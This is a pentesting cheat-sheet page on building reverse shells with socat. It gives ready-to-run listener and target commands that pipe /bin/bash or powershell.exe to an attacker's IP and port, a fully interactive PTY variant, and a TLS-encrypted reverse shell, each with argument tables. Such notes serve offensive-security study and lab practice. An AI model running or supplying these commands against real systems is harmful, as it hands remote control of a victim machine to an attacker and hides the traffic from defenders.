---
description: Creating reverse shells with Socat
---

# Socat

## Basic Reverse Shell

The simplest reverse shell closely mimics the functionality and structure of Netcat.

For all of these techniques it is assumed that there is a working copy of socat installed on the target machine (in order to make connections back).

If socat is not already installed it is possible to utilize a compiled binary which must be placed on the target machine.

* Static pre-compiled socat binary can be [downloaded](https://github.com/andrew-d/static-binaries)

### Attacking Machine

```powershell
C:\Users\offsec> socat -d -d TCP4-LISTEN:443 STDOUT
... socat[4388] N listening on AF=2 0.0.0.0:443
```

<table><thead><tr><th width="220">Argument</th><th>Description</th></tr></thead><tbody><tr><td><code>-d -d</code></td><td>Increase verbosity</td></tr><tr><td><code>TCP-LISTEN:{PORT}</code></td><td>Declare a listener at <code>{PORT}</code></td></tr><tr><td><code>STDOUT</code></td><td>Connect standard output (<code>STDOUT</code>) to the TCP socket</td></tr></tbody></table>

### Target Machine

#### Linux Target

```bash
kali@kali:~$ socat TCP4:10.11.0.22:443 EXEC:/bin/bash
```

<table><thead><tr><th width="213">Argument</th><th>Description</th></tr></thead><tbody><tr><td><code>TCP4:{IP}:{PORT}</code></td><td>Specify the location to reach out</td></tr><tr><td><code>EXEC:{PATH}</code></td><td>Specifies an executable to pipe socat into.<br><br>Similar to netcat's <code>-e</code> flag</td></tr></tbody></table>

#### Windows Target:

<pre class="language-powershell"><code class="lang-powershell"><strong>C:\Users\offsec> socat TCP:0{IP}:{PORT} EXEC:powershell.exe,pipes
</strong></code></pre>

* `pipes` option is used to force powershell (or `cmd.exe`) to use Unix style standard input and output

## Stabilization Techniques

### Fully Stable Shell (Linux Only)

Technique for creating a fully stable shell on Linux target system only (Attacking machine can be any operating system with socat installed).

Attacker Machine:

```bash
$ socat TCP-L:{PORT} FILE:`tty`,raw,echo=0
```

Target Machine:

{% code overflow="wrap" %}
```bash
$ socat TCP4:{Listen-IP}:{Listen-PORT} EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
{% endcode %}

<table><thead><tr><th width="200">Argument</th><th>Description</th></tr></thead><tbody><tr><td><code>EXEC:"bash -li"</code></td><td>Creates an interactive bash session (arguments and purpose listed below).<br><br><code>-li</code> flag launches an <em>interactive</em> shell in <em>login</em> invocation mode</td></tr><tr><td><code>pty</code></td><td>Allocates a pseudo-terminal on the target</td></tr><tr><td><code>stderr</code></td><td>Makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)</td></tr><tr><td><code>sigint</code></td><td>Passes any <code>Ctrl + C</code> commands through into the sub-process, allowing users to kill commands inside the shell</td></tr><tr><td><code>setsid</code></td><td>Creates the process in a new session</td></tr><tr><td><code>sane</code></td><td>Stabilizes the terminal, attempting to "normalize" it.</td></tr></tbody></table>

## Encrypted Shell

The process for generating the SSL certificate is the same as in the bind shell.

### Shell Creation

Once the cert is generated (on the attacker's machine in this case) the shell can be created.

#### Attacker Machine

First the listener should be opened on the attacker machine:

```bash
kali@kali:~$ socat OPENSSL-LISTEN:{PORT},cert=shell.pem,verify=0 -
```

* `verify=0` tells the connection to not bother trying to validate that our certificate has been properly signed by a recognized authority

#### Target Machine

Then the target machine can be induced to call out to the listener:

```bash
user@target:~$ socat OPENSSL:{IP}:{PORT},verify=0 EXEC:/bin/bash
```

